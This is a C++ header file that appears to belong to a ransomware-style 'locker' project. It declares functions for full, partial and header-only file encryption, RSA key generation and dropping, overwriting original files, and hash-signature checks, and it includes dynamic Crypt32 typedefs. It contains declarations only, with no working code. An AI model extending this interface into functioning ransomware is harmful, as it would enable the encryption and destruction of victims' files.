#ifndef _FILE_SYSTEM_H_
#define _FILE_SYSTEM_H_

#include "macro.h"
#include "structures.h"
#include "pathsystem.h"
#include "locker.h"
#include "global_parameters.h"

namespace filesystem
{
	BOOL getParseFile(PFILE_INFO FileInfo);
	BOOL CreateFileOpen(PFILE_INFO FileInfo, DWORD state_const);
	BOOL ReadRSAFile(CRYPT_INFO* CryptInfo);
	BOOL EncryptFileFullData(PFILE_INFO FileInfo);
	BOOL EncryptFilePartly(PFILE_INFO FileInfo, BYTE DataPercent);
	BOOL EncryptFileBlock(PFILE_INFO FileInfo);
	BOOL EncryptFileHeader(PFILE_INFO FileInfo);
	BOOL OptionEncryptMode(PFILE_INFO FileInfo, EncryptModes& mode);
	WCHAR* MakeCopyFile(WCHAR* Path, WCHAR* Filename, WCHAR* exst, WCHAR* FPath);
	BOOL ReadFile_(PFILE_INFO FileInfo);
	BOOL DropRSAKey(WCHAR* Path, BYTE PublicKey[], BYTE PrivateKey[], DWORD SizeKey, DWORD p_SizeKey);
	BOOL HandlerGenKeyPairRSA();
	BOOL EncryptRSA(PFILE_INFO FileInfo);
	BOOL FileCryptEncrypt(PFILE_INFO FileInfo);
	BOOL FileCryptDecrypt(PFILE_INFO FileInfo);
	BOOL HashSignatureFile(SLIST<locker::HLIST>* list, HANDLE HandleHash);
	VOID sort_hash_list(SLIST<HASH_LIST>* list);
	BOOL CreateSignatureFile(SLIST<HASH_LIST>* HashList);
	BOOL VerificationSignatureFile(SLIST<HASH_LIST>* HashList);
	VOID RootKeySignatureTrust(VOID);
	BOOL OverWriteFile(PFILE_INFO FileInfo);
}


BOOL LoadCrypt32();
VOID UnLoadCrypt32();


typedef BOOL(WINAPI* CryptBinaryToStringA_t)
(
	const BYTE* pbBinary,
	DWORD cbBinary,
	DWORD dwFlags,
	LPSTR pszString,
	DWORD* pcchString
	);

typedef BOOL(WINAPI* CryptStringToBinaryA_t)
(
	LPCSTR pszString,
	DWORD cchString,
	DWORD dwFlags,
	BYTE* pbBinary,
	DWORD* pcbBinary,
	DWORD* pdwSkip,
	DWORD* pdwFlags
	);

typedef BOOL(WINAPI* CryptBinaryToStringW_t)
(
	const BYTE* pbBinary,
	DWORD       cbBinary,
	DWORD       dwFlags,
	LPWSTR      pszString,
	DWORD* pcchString
	);

typedef BOOL(WINAPI* CryptStringToBinaryW_t)
(
	LPCWSTR		pszString,
	DWORD		cchString,
	DWORD		dwFlags,
	BYTE* pbBinary,
	DWORD* pcbBinary,
	DWORD* pdwSkip,
	DWORD* pdwFlags
	);

enum
{
	BINARY_CRYPT = 5,
	BASE_CRYPT = 4,
	BINARY_CRYPT_W = 3,
	BASE_CRYPT_W = 2
};


#endif